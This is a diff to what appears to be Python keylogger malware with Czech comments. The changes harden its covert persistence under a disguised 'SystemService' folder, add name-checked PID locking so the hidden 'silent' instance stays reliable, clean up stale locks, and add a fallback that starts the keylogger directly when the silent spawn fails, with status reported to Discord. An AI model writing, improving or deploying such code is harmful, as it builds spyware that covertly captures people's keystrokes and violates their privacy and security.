@@ -35,7 +35,7 @@ CAPTURE_FIELD_TYPE = True
 MAX_RETRIES = 3
 RETRY_DELAY = 5
 
-APP_VERSION = 5  # interní verze pro update check
+APP_VERSION = 6  # interní verze pro update check
 
 # Persistence
 APP_DIR = Path(os.environ.get("APPDATA", Path.home() / ".local/share")) / "SystemService"
@@ -146,15 +146,25 @@ def start_heartbeat():
 # PERSISTENCE
 # ═══════════════════════════════════════════════════════════════
 
-def _pid_alive(pid: int) -> bool:
-    """Ověří, jestli PID patří živému procesu (cross-platform)."""
+def _pid_is_ours(pid: int) -> bool:
+    """Ověří, že PID patří živému procesu, který je naše silent instance.
+    Kontroluje jméno procesu — řeší PID recycling na Windows."""
     if pid <= 0:
         return False
     try:
         if IS_WINDOWS:
             import psutil
-            psutil.Process(pid)
-            return True
+            try:
+                proc = psutil.Process(pid)
+                name = proc.name().lower()
+                # Musí se jmenovat jako naše exe
+                exe_name = os.path.basename(sys.executable).lower()
+                if exe_name in name or "systemservice" in name:
+                    return True
+                # Nesedí jméno → cizí proces s recyklovaným PID
+                return False
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                return False
         else:
             os.kill(pid, 0)
             return True
@@ -175,7 +185,7 @@ def acquire_silent_lock() -> bool:
         if SILENT_LOCK_FILE.exists():
             try:
                 old_pid = int(SILENT_LOCK_FILE.read_text().strip())
-                if _pid_alive(old_pid):
+                if _pid_is_ours(old_pid):
                     return False  # jiný silent už běží
             except (ValueError, OSError):
                 pass  # poškozený lock → smaž a pokračuj
@@ -1012,13 +1022,22 @@ def _spawn_error_log(msg: str):
 def spawn_silent_subprocess():
     """Spawn silent subprocess s fallback mechanismem a plnou diagnostikou."""
     # Kontrola: už běží silent instance podle lockfile?
+    # SELF-HEALING: pokud lock obsahuje PID cizího procesu (PID recycling)
+    # nebo mrtvého procesu, SMAŽ ho a spawnuj nový silent
     try:
         if SILENT_LOCK_FILE.exists():
             try:
                 old_pid = int(SILENT_LOCK_FILE.read_text().strip())
-                if _pid_alive(old_pid):
+                if _pid_is_ours(old_pid):
                     _spawn_error_log(f"SKIP: silent PID {old_pid} already running")
                     return True  # už běží, není potřeba
+                else:
+                    # Stale lock — PID patří cizímu procesu nebo je mrtvý
+                    _spawn_error_log(f"STALE LOCK: PID {old_pid} is not ours — cleaning up")
+                    try:
+                        SILENT_LOCK_FILE.unlink()
+                    except OSError:
+                        pass
             except (ValueError, OSError):
                 pass
     except Exception as e:
@@ -1084,6 +1103,16 @@ if __name__ == "__main__":
         install()
         send_startup_signal()  # i interactive posílá signal
         spawned = spawn_silent_subprocess()
+
+        # FALLBACK: Pokud silent spawn selhal, interactive instance
+        # sama spustí keylogger — lepší než žádný logging
+        if not spawned:
+            try:
+                fallback_logger = Keylogger()
+                fallback_logger.run_background()
+                start_heartbeat()
+            except Exception as e:
+                send_error_signal("Interactive fallback keylogger", e)
         # Pošli spawn status na Discord ať vidíme co se děje
         try:
             spawn_status = "✅ Silent spawned" if spawned else "❌ Spawn FAILED — check %APPDATA%\\SystemService\\spawn.log"
